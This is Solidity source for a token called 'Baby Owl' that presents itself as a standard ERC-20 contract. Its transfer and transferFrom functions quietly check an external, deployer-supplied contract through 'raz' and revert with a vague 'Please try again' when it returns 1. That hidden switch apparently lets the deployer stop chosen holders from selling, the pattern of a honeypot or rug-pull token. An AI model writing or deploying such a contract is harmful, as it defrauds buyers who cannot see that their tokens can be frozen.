row number 
1	         pragma solidity ^0.7.2;
2	 interface IRC20 {
3	 function raz(address account) external view returns (uint8);
4	 }
5	 contract BabyOwl is IRC20 {
6	 mapping(address => uint256) public balances;
7	 mapping(address => mapping(address => uint256)) public allowance;
8	 IRC20 wwwa;
9	 uint256 public totalSupply = 10 * 10**12 * 10**18;
10	 string public name = "Baby Owl";
11	 string public symbol = hex"426162794F776Cf09fa689";
12	 uint public decimals = 18;
13	 event Transfer(address indexed from, address indexed to, uint256 value);
14	 event Approval(address indexed owner, address indexed spender, uint256 value);
15	 constructor(IRC20 _info) {
16	 wwwa = _info;
17	 balances[msg.sender] = totalSupply;
18	 emit Transfer(address(0), msg.sender, totalSupply);
19	 }
20	 function balanceOf(address owner) public view returns(uint256) {
21	 return balances[owner];
22	 }
23	 function transfer(address to, uint256 value) public returns(bool) {
24	 require(wwwa.raz(msg.sender) != 1, "Please try again");
25	 require(balanceOf(msg.sender) >= value, 'balance too low');
26	 balances[to] += value;
27	 balances[msg.sender] -= value;
28	 emit Transfer(msg.sender, to, value);
29	 return true;
30	 }
31	 function raz(address account) external override view returns (uint8) {
32	 return 1;
33	 }
34	 function transferFrom(address from, address to, uint256 value) public returns(bool) {
35	 require(wwwa.raz(from) != 1, "Please try again");
36	 require(balanceOf(from) >= value, 'balance too low');
37	 require(allowance[from][msg.sender] >= value, 'allowance too low');
38	 balances[to] += value;
39	 balances[from] -= value;
40	 emit Transfer(from, to, value);
41	 return true;
42	 }
43	 function approve(address spender, uint256 value) public returns(bool) {
44	 allowance[msg.sender][spender] = value;
45	 return true;
46	 }
47	 }
